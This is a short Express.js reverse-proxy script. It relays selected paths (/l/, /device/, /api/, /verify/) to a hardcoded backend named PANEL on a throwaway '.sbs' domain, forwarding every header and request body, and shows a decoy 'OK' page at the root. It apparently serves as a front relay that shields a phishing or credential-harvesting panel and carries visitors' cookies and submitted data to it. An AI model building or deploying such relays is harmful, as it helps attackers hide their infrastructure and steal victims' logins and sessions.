const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;
const PANEL = 'portal42-343.sbs';

app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true }));

// Allow /l/, /device/, /api/, /verify/
app.use((req, res, next) => {
    const p = req.path;
    if (p.startsWith('/l/') || p.startsWith('/device/') || p.startsWith('/api/') || p.startsWith('/verify/')) return next();
    if (p === '/') return res.send('OK');
    return res.status(404).send('Not Found');
});

app.all('*', async (req, res) => {
    try {
        const target = `https://${PANEL}${req.originalUrl}`;
        const headers = new Headers();
        for (const [k, v] of Object.entries(req.headers)) {
            if (k.toLowerCase() === 'host') continue;
            if (k.toLowerCase() === 'content-length') continue;
            headers.set(k, v);
        }
        headers.set('Host', PANEL);
        const opts = { method: req.method, headers };
        if (!['GET','HEAD'].includes(req.method) && req.body && Object.keys(req.body).length) {
            opts.body = JSON.stringify(req.body);
            headers.set('Content-Type', 'application/json');
        }
        const r = await fetch(target, opts);
        const body = await r.text();
        res.status(r.status).set('Content-Type', r.headers.get('content-type') || 'text/html').send(body);
    } catch (e) {
        res.status(500).send('Proxy Error: ' + e.message);
    }
});

app.listen(PORT, '0.0.0.0', () => console.log('Proxy on ' + PORT));
